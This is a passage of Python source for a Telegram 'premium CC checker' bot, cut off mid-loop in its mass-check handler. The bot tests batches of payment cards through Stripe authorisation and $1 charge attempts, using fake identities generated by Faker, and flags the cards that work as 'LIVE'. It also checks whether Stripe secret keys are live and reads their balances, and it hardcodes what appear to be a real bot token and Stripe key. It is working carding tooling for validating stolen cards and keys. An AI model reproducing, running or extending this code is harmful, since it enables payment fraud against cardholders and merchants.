#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║              💎 PREMIUM CC CHECKER BOT V3.0 💎               ║
║         Advanced Multi-Gateway Card Checking System          ║
╚═══════════════════════════════════════════════════════════════╝
"""

import asyncio
import concurrent.futures
import json
import logging
import os
import random
import re
import sqlite3
import string
import sys
import time
import urllib.parse
from datetime import datetime, timedelta
from io import BytesIO
from pathlib import Path

import requests
from faker import Faker

# ─── Telegram Bot ───
try:
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
    from aiogram.types import (
        InlineKeyboardButton, InlineKeyboardMarkup,
        ReplyKeyboardMarkup, KeyboardButton,
        ContentTypes, InputFile
    )
    from aiogram.utils.exceptions import Throttled
except ImportError:
    print("❌ Install: pip install aiogram==2.25.1")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════
# 🔐 CONFIGURATION — EDIT THESE FOR YOUR DEPLOYMENT
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = "8760415886:AAH-JhrbqKGtfyc_-zJ4ewGedle2Q-vvJj0"
OWNER_ID = 8598993143          # ← YOUR TELEGRAM USER ID
OWNER_USERNAME = "@YourName"   # ← YOUR USERNAME
CHANNEL = "https://t.me/cyberassemble"
SUPPORT_GROUP = "https://t.me/assemblechat"

PREFIX = "!/."
ANTISPAM_SECONDS = 45

# ─── DATABASE ───
DB_PATH = "checkerbot.db"

# ─── PROXY (optional — leave empty if not using) ───
PROXY = ""  # e.g. "http://user:pass@ip:port" or leave ""

# ─── STRIPE PUBLIC KEYS FOR CHARGING ───
STRIPE_PK = "pk_live_51F0EDvB1Ma5SOvilMZe4TNFodNsWG1JYYPHSGiDvRYkKEHFRfxWZx540KUSbS23ypfSNvDJyq06kakMaPw5QGhMX00VdgIt50x"

# ═══════════════════════════════════════════════════════════════
# 📦 BOT INIT
# ═══════════════════════════════════════════════════════════════

bot = Bot(token=BOT_TOKEN, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

fake = Faker()
Faker.seed(random.randint(1, 99999))

# ─── LOGGING ───
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
log = logging.getLogger("CCBot")

# ═══════════════════════════════════════════════════════════════
# 🗄️ DATABASE SETUP
# ═══════════════════════════════════════════════════════════════

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            level TEXT DEFAULT 'free',
            joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            total_checks INTEGER DEFAULT 0,
            total_approved INTEGER DEFAULT 0,
            banned INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS premium (
            user_id INTEGER PRIMARY KEY,
            added_by INTEGER,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires_at TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS blacklist (
            bin TEXT PRIMARY KEY,
            added_by INTEGER,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS authorized_groups (
            group_id INTEGER PRIMARY KEY,
            added_by INTEGER,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS stats (
            date TEXT PRIMARY KEY,
            total_checks INTEGER DEFAULT 0,
            total_approved INTEGER DEFAULT 0,
            total_declined INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS api_keys (
            user_id INTEGER PRIMARY KEY,
            sk_key TEXT,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    conn.close()
    log.info("✅ Database initialized")

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    conn.close()

def db_fetch(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    rows = c.fetchall()
    conn.close()
    return rows

def db_fetch_one(query, params=()):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(query, params)
    row = c.fetchone()
    conn.close()
    return row

# ═══════════════════════════════════════════════════════════════
# 👤 USER MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def register_user(user_id, username="", first_name=""):
    existing = db_fetch_one("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    if not existing:
        level = "owner" if user_id == OWNER_ID else "free"
        db_exec(
            "INSERT INTO users (user_id, username, first_name, level) VALUES (?,?,?,?)",
            (user_id, username, first_name, level)
        )

def get_level(user_id):
    if user_id == OWNER_ID:
        return "OWNER"
    row = db_fetch_one("SELECT level FROM users WHERE user_id=?", (user_id,))
    if row:
        return row[0].upper()
    return "FREE"

def is_banned(user_id):
    row = db_fetch_one("SELECT banned FROM users WHERE user_id=?", (user_id,))
    return row and row[0] == 1

def is_premium(user_id):
    row = db_fetch_one("SELECT user_id FROM premium WHERE user_id=?", (user_id,))
    return row is not None

def add_premium(user_id, added_by):
    db_exec("INSERT OR REPLACE INTO premium (user_id, added_by) VALUES (?,?)", (user_id, added_by))
    db_exec("UPDATE users SET level='premium' WHERE user_id=?", (user_id,))

def remove_premium(user_id):
    db_exec("DELETE FROM premium WHERE user_id=?", (user_id,))
    db_exec("UPDATE users SET level='free' WHERE user_id=?", (user_id,))

def update_stats(approved=False):
    today = datetime.now().strftime("%Y-%m-%d")
    existing = db_fetch_one("SELECT total_checks FROM stats WHERE date=?", (today,))
    if existing:
        if approved:
            db_exec("UPDATE stats SET total_checks=total_checks+1, total_approved=total_approved+1 WHERE date=?", (today,))
        else:
            db_exec("UPDATE stats SET total_checks=total_checks+1, total_declined=total_declined+1 WHERE date=?", (today,))
    else:
        app = 1 if approved else 0
        dec = 0 if approved else 1
        db_exec("INSERT INTO stats (date, total_checks, total_approved, total_declined) VALUES (?,1,?,?)", (today, app, dec))

def increment_user_checks(user_id, approved=False):
    if approved:
        db_exec("UPDATE users SET total_checks=total_checks+1, total_approved=total_approved+1 WHERE user_id=?", (user_id,))
    else:
        db_exec("UPDATE users SET total_checks=total_checks+1 WHERE user_id=?", (user_id,))

# ═══════════════════════════════════════════════════════════════
# 📋 BIN LOOKUP & VALIDATION
# ═══════════════════════════════════════════════════════════════

def luhn_check(cc):
    if not cc or not cc.isdigit():
        return False
    n_sum = 0
    is_second = False
    for d in cc[::-1]:
        d = ord(d) - 48
        if is_second:
            d *= 2
        n_sum += d // 10 + d % 10
        is_second = not is_second
    return n_sum % 10 == 0

def bin_lookup(bin_num):
    """Fetch detailed BIN info"""
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}",
                        headers={"Accept-Version": "3", "User-Agent": "Mozilla/5.0"},
                        timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    try:
        r = requests.get(f"https://bin-ip-checker.p.rapidapi.com/?bin={bin_num[:6]}",
                        headers={"x-rapidapi-key": "demo", "x-rapidapi-host": "bin-ip-checker.p.rapidapi.com"},
                        timeout=5)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def format_bin_info(data):
    """Pretty format BIN data"""
    if not data:
        return "❌ **BIN Not Found**"
    scheme = data.get("scheme", "N/A").upper()
    brand = data.get("brand", "N/A")
    ctype = data.get("type", "N/A").upper()
    bank = data.get("bank", {})
    bank_name = bank.get("name", "N/A") if isinstance(bank, dict) else "N/A"
    country = data.get("country", {})
    country_name = country.get("name", "N/A") if isinstance(country, dict) else "N/A"
    emoji = country.get("emoji", "") if isinstance(country, dict) else ""
    currency = country.get("currency", "N/A") if isinstance(country, dict) else "N/A"
    
    prepaid = data.get("prepaid", False)
    
    text = (
        f"🏦 **BIN Details**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"💳 **Scheme:** `{scheme}`\n"
        f"🏷️ **Brand:** `{brand}`\n"
        f"📋 **Type:** `{ctype}`\n"
        f"🏛️ **Bank:** `{bank_name}`\n"
        f"🌍 **Country:** {emoji} `{country_name}`\n"
        f"💰 **Currency:** `{currency}`\n"
        f"🔄 **Prepaid:** {'✅ Yes' if prepaid else '❌ No'}"
    )
    return text

def is_blacklisted(bin_num):
    row = db_fetch_one("SELECT bin FROM blacklist WHERE bin=?", (bin_num[:6],))
    return row is not None

# ═══════════════════════════════════════════════════════════════
# 💳 CARD PARSING
# ═══════════════════════════════════════════════════════════════

def parse_card(text):
    """Parse card | mm | yy | cvv from any format"""
    nums = re.findall(r"\d+", text)
    if len(nums) < 3:
        return None
    
    if len(nums) == 3:
        cc = nums[0]
        if len(nums[1]) == 3:
            mes = nums[2][:2]
            ano = nums[2][2:]
            cvv = nums[1]
        else:
            mes = nums[1][:2]
            ano = nums[1][2:]
            cvv = nums[2]
    else:
        cc = nums[0]
        if len(nums[1]) == 3:
            mes = nums[2]
            ano = nums[3]
            cvv = nums[1]
        else:
            mes = nums[1]
            ano = nums[2]
            cvv = nums[3]
        # Fix swapped month/year
        if len(mes) == 2 and (mes > "12" or mes < "01"):
            mes, ano = ano, mes
    
    # Validate
    if not cc or not cc.isdigit():
        return None
    if int(cc[0]) not in [3, 4, 5, 6]:
        return None
    if cc[0] == "3" and len(cc) != 15 and len(cc) != 16:
        return None
    if cc[0] != "3" and len(cc) != 16:
        return None
    if not luhn_check(cc):
        return None
    if len(mes) not in [2, 4]:
        return None
    if len(mes) == 2 and (mes > "12" or mes < "01"):
        return None
    if len(ano) not in [2, 4]:
        return None
    if len(ano) == 2 and (ano < "23" or ano > "30"):
        return None
    if len(ano) == 4 and (ano < "2023" or ano > "2030"):
        return None
    if cc[0] == "3" and len(cvv) != 4:
        return None
    if cc[0] != "3" and len(cvv) != 3:
        return None
    
    return {"cc": cc, "mes": mes, "ano": ano, "cvv": cvv}

def parse_card_lines(text):
    """Parse multiple cards from text"""
    lines = text.strip().split("\n")
    cards = []
    for line in lines:
        card = parse_card(line)
        if card and card["cc"] not in [c["cc"] for c in cards]:
            cards.append(card)
    return cards

# ═══════════════════════════════════════════════════════════════
# 🔌 GATEWAY FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def get_proxies():
    if PROXY:
        return {"http": PROXY, "https": PROXY}
    return None

def stripe_auth(cc, mes, ano, cvv):
    """Stripe Auth (non-3D) - Setup Intent confirm"""
    proxies = get_proxies()
    start = time.perf_counter()
    
    try:
        # Step 1: Create setup intent
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        r1 = requests.post(
            "https://api.stripe.com/v1/setup_intents",
            data="confirm=false&payment_method_types[]=card",
            headers=headers,
            proxies=proxies,
            timeout=20
        )
        r1j = r1.json()
        seti = r1j["id"]
        seti_secret = r1j["client_secret"]
        
        # Step 2: Confirm with card
        exp = f"{mes}/{ano}" if len(ano) == 2 else f"{mes}/{ano[2:]}"
        data2 = (
            f"payment_method_data[type]=card"
            f"&payment_method_data[card][number]={cc}"
            f"&payment_method_data[card][cvc]={cvv}"
            f"&payment_method_data[card][exp_month]={mes}"
            f"&payment_method_data[card][exp_year]={ano[-2:] if len(ano)==4 else ano}"
            f"&payment_method_data[billing_details][name]={fake.name()}"
            f"&payment_method_data[guid]={fake.uuid4()}"
            f"&payment_method_data[muid]={fake.uuid4()}"
            f"&payment_method_data[sid]={fake.uuid4()}"
            f"&payment_method_data[pasted_fields]=number"
            f"&payment_method_data[payment_user_agent]=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604"
            f"&payment_method_data[time_on_page]=97200"
            f"&expected_payment_method_type=card"
            f"&use_stripe_sdk=true"
            f"&key={STRIPE_PK}"
            f"&client_secret={seti_secret}"
        )
        r2 = requests.post(
            f"https://api.stripe.com/v1/setup_intents/{seti}/confirm",
            data=data2, proxies=proxies, timeout=25
        )
        r2j = r2.json()
        elapsed = time.perf_counter() - start
        
        r2t = r2.text
        if "succeeded" in r2t:
            return {"status": "✅ APPROVED", "code": "GREEN", "msg": "Card Approved ✅", "time": f"{elapsed:.2f}s"}
        elif "incorrect_number" in r2t:
            return {"status": "❌ INCORRECT NUMBER", "code": "incorrect_number", "msg": r2j.get("error",{}).get("code","declined"), "time": f"{elapsed:.2f}s"}
        elif "error" in r2t:
            err = r2j.get("error", {})
            dc = err.get("decline_code", err.get("code", "declined"))
            return {"status": f"❌ {dc.upper()}", "code": dc, "msg": dc, "time": f"{elapsed:.2f}s"}
        else:
            return {"status": "❌ UNKNOWN", "code": "unknown", "msg": "Unknown Response", "time": f"{elapsed:.2f}s"}
            
    except requests.exceptions.Timeout:
        return {"status": "❌ TIMEOUT", "code": "timeout", "msg": "Gateway Timeout", "time": f"{time.perf_counter()-start:.2f}s"}
    except Exception as e:
        return {"status": "❌ ERROR", "code": "error", "msg": str(e)[:40], "time": f"{time.perf_counter()-start:.2f}s"}


def stripe_charge(cc, mes, ano, cvv, amount=1, currency="usd"):
    """Stripe Charge (creates payment intent & attempts capture)"""
    proxies = get_proxies()
    start = time.perf_counter()
    
    # Generate random customer details
    name = fake.name()
    email = fake.email()
    phone = fake.phone_number()
    address = fake.address().replace("\n", ", ")
    
    try:
        # Step 1: Create payment method
        h1 = {"Content-Type": "application/x-www-form-urlencoded"}
        pm_data = (
            f"type=card"
            f"&card[number]={cc}"
            f"&card[cvc]={cvv}"
            f"&card[exp_month]={mes}"
            f"&card[exp_year]={ano[-2:] if len(ano)==4 else ano}"
            f"&billing_details[name]={urllib.parse.quote(name)}"
            f"&billing_details[email]={email}"
        )
        r1 = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=pm_data, proxies=proxies, timeout=20
        )
        r1j = r1.json()
        pm_id = r1j.get("id")
        if not pm_id:
            elapsed = time.perf_counter() - start
            err = r1j.get("error", {}).get("code", "pm_failed")
            return {"status": f"❌ {err.upper()}", "code": err, "msg": err, "time": f"{elapsed:.2f}s", "charged": False}
        
        # Step 2: Create payment intent
        if amount >= 1:
            amount_cents = int(amount * 100)
        else:
            amount_cents = 50  # min $0.50
        
        pi_data = (
            f"amount={amount_cents}"
            f"&currency={currency}"
            f"&payment_method={pm_id}"
            f"&confirm=true"
            f"&off_session=true"
            f"&return_url=https://checkout.stripe.com/callback"
            f"&description=Premium+CC+Check"
        )
        r2 = requests.post(
            "https://api.stripe.com/v1/payment_intents",
            data=pi_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            proxies=proxies,
            timeout=25
        )
        r2j = r2.json()
        elapsed = time.perf_counter() - start
        
        status = r2j.get("status", "unknown")
        if status == "succeeded":
            return {
                "status": "✅ CHARGED $" + str(amount),
                "code": "GREEN",
                "msg": f"Successfully charged ${amount} ✅",
                "time": f"{elapsed:.2f}s",
                "charged": True,
                "charge_id": r2j.get("id", "N/A")
            }
        elif status == "requires_action":
            return {
                "status": "⚠️ 3D REQUIRED",
                "code": "requires_action",
                "msg": "3D Secure Required",
                "time": f"{elapsed:.2f}s",
                "charged": False
            }
        elif status == "requires_payment_method":
            err = r2j.get("last_payment_error", {})
            dc = err.get("decline_code", err.get("code", "declined"))
            return {
                "status": f"❌ {dc.upper()}",
                "code": dc,
                "msg": dc,
                "time": f"{elapsed:.2f}s",
                "charged": False
            }
        else:
            return {
                "status": f"❌ {status.upper()}",
                "code": status,
                "msg": status,
                "time": f"{elapsed:.2f}s",
                "charged": False
            }
            
    except requests.exceptions.Timeout:
        return {"status": "❌ TIMEOUT", "code": "timeout", "msg": "Gateway Timeout", "time": f"{time.perf_counter()-start:.2f}s", "charged": False}
    except Exception as e:
        return {"status": "❌ ERROR", "code": "error", "msg": str(e)[:40], "time": f"{time.perf_counter()-start:.2f}s", "charged": False}


def check_sk_key(sk_key):
    """Check Stripe Secret Key balance"""
    try:
        r = requests.get(
            "https://api.stripe.com/v1/balance",
            auth=(sk_key, ""),
            timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            pending = data.get("pending", [])
            available = data.get("available", [])
            
            total_balance = 0
            currency = "usd"
            
            for p in pending:
                total_balance += p.get("amount", 0)
                currency = p.get("currency", "usd")
            
            # Also check account info
            r2 = requests.get(
                "https://api.stripe.com/v1/account",
                auth=(sk_key, ""),
                timeout=10
            )
            account_data = r2.json() if r2.status_code == 200 else {}
            
            return {
                "live": True,
                "balance": total_balance / 100,
                "currency": currency.upper(),
                "account_name": account_data.get("settings", {}).get("dashboard", {}).get("display_name", "N/A"),
                "country": account_data.get("country", "N/A").upper(),
                "charges_enabled": account_data.get("charges_enabled", False),
                "payouts_enabled": account_data.get("payouts_enabled", False),
            }
        else:
            return {"live": False, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"live": False, "error": str(e)[:50]}


# ═══════════════════════════════════════════════════════════════
# 🧰 ACCESS CONTROL HELPER
# ═══════════════════════════════════════════════════════════════

async def check_access(message, kk_msg):
    """Returns (has_access, level)"""
    user_id = message.from_user.id
    level = get_level(user_id)
    
    if is_banned(user_id):
        await kk_msg.edit_text("🚫 **You are banned from using this bot.**")
        return False, level
    
    chat_type = message.chat.type
    
    # Private chat: only owner & premium
    if chat_type == "private":
        if level in ["OWNER", "PREMIUM"]:
            return True, level
        else:
            btn = InlineKeyboardButton("💎 Get Premium", url=SUPPORT_GROUP)
            kb = InlineKeyboardMarkup().add(btn)
            btn2 = InlineKeyboardButton("🔚 Close", callback_data="close")
            kb.add(btn2)
            await kk_msg.edit_text(
                "🚫 **Private access restricted**\n\n"
                "🔹 Free users can use in authorized groups\n"
                "🔹 Purchase premium for private access\n\n"
                f"👤 Your Level: **{level}**",
                reply_markup=kb, disable_web_page_preview=True
            )
            return False, level
    
    # Group/Supergroup
    elif chat_type in ["group", "supergroup"]:
        gid = message.chat.id
        row = db_fetch_one("SELECT group_id FROM authorized_groups WHERE group_id=?", (gid,))
        if not row:
            await kk_msg.edit_text("🚫 **This group is not authorized.**\nContact owner to add this group.")
            return False, level
        
        # Anti-spam for free users
        if level == "FREE":
            try:
                await dp.throttle("chk", rate=ANTISPAM_SECONDS)
            except Throttled:
                kb = InlineKeyboardMarkup()
                kb.add(InlineKeyboardButton("💎 Premium", url=SUPPORT_GROUP))
                kb.add(InlineKeyboardButton("🔚 Close", callback_data="close"))
                await kk_msg.edit_text(
                    "⏳ **Anti-Spam Active**\n"
                    f"Wait {ANTISPAM_SECONDS}s between checks\n"
                    "💎 Premium = no limits!",
                    reply_markup=kb, disable_web_page_preview=True
                )
                return False, level
        return True, level
    
    return False, level


# ═══════════════════════════════════════════════════════════════
# 🎨 UI HELPERS
# ═══════════════════════════════════════════════════════════════

def main_menu_kb():
    b1 = InlineKeyboardButton("💳 Check Cards", callback_data="check_menu")
    b2 = InlineKeyboardButton("🔍 Tools", callback_data="tools_menu")
    b3 = InlineKeyboardButton("📊 My Stats", callback_data="my_stats")
    b4 = InlineKeyboardButton("💎 Premium", callback_data="premium_info")
    b5 = InlineKeyboardButton("❓ Help", callback_data="help_menu")
    b6 = InlineKeyboardButton("🔚 Close", callback_data="close")
    return InlineKeyboardMarkup(row_width=2).add(b1, b2).add(b3, b4).add(b5, b6)

def back_close_kb():
    b1 = InlineKeyboardButton("🔙 Back", callback_data="main_menu")
    b2 = InlineKeyboardButton("🔚 Close", callback_data="close")
    return InlineKeyboardMarkup().add(b1, b2)


def format_card_result(card, result, bin_info=None):
    """Beautiful formatted card check result"""
    cc_display = f"{card['cc'][:6]}xxxxxx{card['cc'][-4:]}"
    
    # Color coding
    status_icon = result["status"]
    is_approved = "GREEN" in result.get("code", "").upper() or "APPROVED" in result.get("status", "")
    
    lines = [
        "╔══════════════════════════════╗",
        f"║  {'✅ LIVE CARD' if is_approved else '❌ DECLINED'}        ║",
        "╚══════════════════════════════╝",
        "",
        f"💳 **Card:** `{card['cc']}|{card['mes']}|{card['ano']}|{card['cvv']}`",
        f"📊 **Response:** {result['status']}",
        f"📝 **Msg:** `{result['msg']}`",
        f"⏱ **Time:** `{result.get('time', 'N/A')}`",
    ]
    
    if bin_info:
        scheme = bin_info.get("scheme", "N/A").upper()
        ctype = bin_info.get("type", "N/A").upper()
        brand = bin_info.get("brand", "N/A")
        bank = bin_info.get("bank", {})
        bank_name = bank.get("name", "N/A") if isinstance(bank, dict) else "N/A"
        country = bin_info.get("country", {})
        country_name = country.get("name", "N/A") if isinstance(country, dict) else "N/A"
        emoji = country.get("emoji", "") if isinstance(country, dict) else ""
        
        lines.extend([
            "",
            "**━━━ BIN Info ━━━**",
            f"🏦 **{scheme}** {emoji}",
            f"📋 **Type:** `{ctype} {brand}`",
            f"🏛️ **Bank:** `{bank_name}`",
            f"🌍 **Country:** `{country_name}`",
        ])
    
    if is_approved:
        lines.extend(["", "💥 **STATUS: LIVE ✅**"])
    else:
        lines.extend(["", f"📌 **Reason:** `{result.get('msg', 'N/A')}`"])
    
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━")
    
    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════
# 🤖 BOT HANDLERS
# ═══════════════════════════════════════════════════════════════

# ── START ──
@dp.message_handler(commands=["start", "help"], commands_prefix=PREFIX)
async def cmd_start(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    welcome_text = (
        f"╔══════════════════════════════╗\n"
        f"║  💎 **PREMIUM CC CHECKER** 💎  ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"👋 **Welcome, {user.first_name}!**\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"👤 **Level:** `{get_level(user.id)}`\n\n"
        f"📌 **Commands:**\n"
        f"`/chk` - Single card check\n"
        f"`/mass` - Mass check (send .txt)\n"
        f"`/bin` - BIN lookup\n"
        f"`/sk` - Check Stripe key\n"
        f"`/gen` - Generate cards\n"
        f"`/cmds` - Full menu\n"
        f"`/me` - Your info\n\n"
        f"💡 **Send `/cmds` to explore all features**"
    )
    
    await message.reply(welcome_text, reply_markup=main_menu_kb(), disable_web_page_preview=True)


# ── CMDS ──
@dp.message_handler(commands=["cmd", "cmds", "commands"], commands_prefix=PREFIX)
async def cmd_cmds(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    await message.reply(
        "📋 **Command Center**\n"
        "Choose a category below:",
        reply_markup=main_menu_kb(), disable_web_page_preview=True
    )


# ── ME ──
@dp.message_handler(commands=["me", "info", "id"], commands_prefix=PREFIX)
async def cmd_me(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    # Get stats
    row = db_fetch_one("SELECT total_checks, total_approved FROM users WHERE user_id=?", (user.id,))
    checks = row[0] if row else 0
    approved = row[1] if row else 0
    
    level = get_level(user.id)
    
    # Premium expiry
    expiry = "Lifetime"
    if level == "PREMIUM":
        exp_row = db_fetch_one("SELECT expires_at FROM premium WHERE user_id=?", (user.id,))
        if exp_row and exp_row[0]:
            expiry = exp_row[0]
    
    text = (
        f"👤 **User Profile**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"**Name:** {user.first_name} {user.last_name or ''}\n"
        f"**Username:** @{user.username or 'N/A'}\n"
        f"**User ID:** `{user.id}`\n"
        f"**Level:** `{level}`\n"
        f"**Premium:** {'✅' if level in ['OWNER', 'PREMIUM'] else '❌'}\n\n"
        f"📊 **Your Statistics**\n"
        f"**Total Checks:** `{checks}`\n"
        f"**Approved:** `{approved}`\n"
        f"**Success Rate:** `{f'{approved/checks*100:.1f}%' if checks > 0 else '0%'}`\n"
    )
    
    await message.reply(text, reply_markup=back_close_kb(), disable_web_page_preview=True)


# ── SINGLE CARD CHECK ──
@dp.message_handler(commands=["chk", "ss", "auth", "check"], commands_prefix=PREFIX)
async def cmd_chk(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    kk = await message.reply("⏳ **Processing...**")
    
    # Access check
    has_access, level = await check_access(message, kk)
    if not has_access:
        return
    
    # Parse card
    text = message.text[len(message.text.split()[0]):].strip()
    if not text:
        # Check if replying to a message with card
        if message.reply_to_message and message.reply_to_message.text:
            text = message.reply_to_message.text.strip()
    
    if not text:
        return await kk.edit_text(
            "❌ **Usage:** `/chk 4921811111111111|12|25|123`\n"
            "Or reply to a message containing a card.",
            reply_markup=back_close_kb()
        )
    
    card = parse_card(text)
    if not card:
        return await kk.edit_text(
            "❌ **Invalid Card Format**\n"
            "Use: `cc|mm|yy|cvv`\n"
            "Make sure the card passes Luhn validation.",
            reply_markup=back_close_kb()
        )
    
    # Blacklist check
    if is_blacklisted(card["cc"]):
        return await kk.edit_text(f"🚫 **BIN {card['cc'][:6]} is blacklisted**")
    
    await kk.edit_text("🔍 **Checking...**\n━━━━━━━━━\n🔄 BIN Lookup...")
    
    # BIN lookup
    bin_data = bin_lookup(card["cc"])
    
    await kk.edit_text("🔍 **Checking...**\n━━━━━━━━━\n✅ BIN Found\n🔄 Stripe Auth...")
    
    # Stripe Auth check
    result = stripe_auth(card["cc"], card["mes"], card["ano"], card["cvv"])
    
    # Update stats
    is_approved = "GREEN" in result.get("code", "").upper() or "APPROVED" in result.get("status", "")
    update_stats(approved=is_approved)
    increment_user_checks(user.id, approved=is_approved)
    
    # Format result
    output = format_card_result(card, result, bin_data)
    output += f"\n👤 **Checked by:** [{user.first_name}](tg://user?id={user.id}) [`{level}`]\n"
    output += f"🤖 **Bot by:** {OWNER_USERNAME}"
    
    await kk.edit_text(output, disable_web_page_preview=True)


# ── CHARGE CHECK ($1) ──
@dp.message_handler(commands=["ch1", "charge", "c1"], commands_prefix=PREFIX)
async def cmd_charge(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    kk = await message.reply("⏳ **Processing $1 Charge...**")
    
    has_access, level = await check_access(message, kk)
    if not has_access:
        return
    
    if level not in ["OWNER", "PREMIUM"]:
        return await kk.edit_text(
            "🚫 **$1 Charge is premium-only**\n💎 Purchase premium to use this gate.",
            reply_markup=back_close_kb()
        )
    
    text = message.text[len(message.text.split()[0]):].strip()
    if message.reply_to_message and message.reply_to_message.text:
        text = message.reply_to_message.text.strip()
    
    if not text:
        return await kk.edit_text("❌ **Usage:** `/charge 4921811111111111|12|25|123`")
    
    card = parse_card(text)
    if not card:
        return await kk.edit_text("❌ **Invalid card**", reply_markup=back_close_kb())
    
    if is_blacklisted(card["cc"]):
        return await kk.edit_text(f"🚫 **BIN {card['cc'][:6]} blacklisted**")
    
    await kk.edit_text("💳 **$1 Charge Test**\n━━━━━━━━━\n🔄 Processing...")
    
    bin_data = bin_lookup(card["cc"])
    result = stripe_charge(card["cc"], card["mes"], card["ano"], card["cvv"], amount=1)
    
    is_approved = result.get("charged", False)
    update_stats(approved=is_approved)
    increment_user_checks(user.id, approved=is_approved)
    
    output = format_card_result(card, result, bin_data)
    output += f"\n👤 **Checked by:** [{user.first_name}](tg://user?id={user.id}) [`{level}`]\n"
    output += f"🤖 **Bot by:** {OWNER_USERNAME}"
    
    await kk.edit_text(output, disable_web_page_preview=True)


# ── MASS CHECK (from reply to .txt) ──
@dp.message_handler(commands=["mass", "batch"], commands_prefix=PREFIX)
async def cmd_mass(message: types.Message):
    user = message.from_user
    register_user(user.id, user.username or "", user.first_name)
    
    kk = await message.reply("⏳ **Preparing mass check...**")
    
    has_access, level = await check_access(message, kk)
    if not has_access:
        return
    
    max_cards = 50 if level in ["OWNER", "PREMIUM"] else 10
    
    await kk.edit_text(
        f"📤 **Mass Card Check**\n\n"
        f"Send a `.txt` file with cards (one per line)\n"
        f"Format: `cc|mm|yy|cvv`\n\n"
        f"📊 **Your limit:** `{max_cards}` cards\n"
        f"💎 Premium: up to 100 cards\n\n"
        f"⏱️ **Waiting for file...** (30s timeout)"
    )
    
    # Wait for file upload
    @dp.message_handler(content_types=ContentTypes.DOCUMENT, chat_id=message.chat.id)
    async def handle_file(msg: types.Message):
        if not msg.document or not msg.document.file_name.endswith(".txt"):
            return await msg.reply("❌ Please send a `.txt` file")
        
        file_info = await bot.get_file(msg.document.file_id)
        file_bytes = await msg.download(destination=BytesIO())
        file_bytes.seek(0)
        content = file_bytes.read().decode("utf-8", errors="ignore")
        
        cards = parse_card_lines(content)[:max_cards]
        
        if not cards:
            return await msg.reply("❌ No valid cards found in file")
        
        status_msg = await msg.reply(f"📊 **Found {len(cards)} cards**\n🔄 Starting check...")
        
        results = []
        approved_count = 0
        
        for i, card in enumerate(cards):
            await status_msg.edit_text(
                f"📊 **Checking...** `{i+1}/{len(cards)}`\n"
                f"✅ Approved: `{approved_count}`\n"
                f"━━━━━━━━━━━━━━━\n"
                f"💳 `{card['cc'][:6]}xxxx{card['cc'][-4:]}`"
            )
            
            result = stripe_auth(card["cc"], card["mes"], card["ano"], card["cvv"])
            is_approved = "GREEN" in result.get("code", "").upper()
            if is_approved:
                approved_count += 1
            
            bin_info = bin_lookup(card["cc"])
            results.append((card, result, bin_info))
            
            update_stats(approved=is_approved)
            increment_user_checks(msg.from_user.id, approved=is_approved)
        
        # Summary
        output = (
            f"╔══════════════════════════════╗\n"
            f"║  📊 **MASS CHECK RESULTS**   ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"📥 **Cards Checked:** `{len(results)}`\n"
            f"✅ **Approved:** `{approved_count}`\n"
            f"❌ **Declined:** `{len(results) - approved_count}`\n"
            f"📈 **Rate:** `{approved_count/len(results)*100:.1f}%`\n\n"
            f"━━━ **Results** ━━━\n\n"
        )
        
        for card, result, bin_info in results[:10]:  # Show first 10
            bin_country = ""
            if bin_info:
                country = bin_info.get("country", {})
                if isinstance(country, dict):
                    bin_country = country.get("emoji", "") + " " + country.get("name", "")[:15]
            
            is_green = "GREEN" in result.get("code", "").upper()
            icon = "✅" if is_green else "❌"
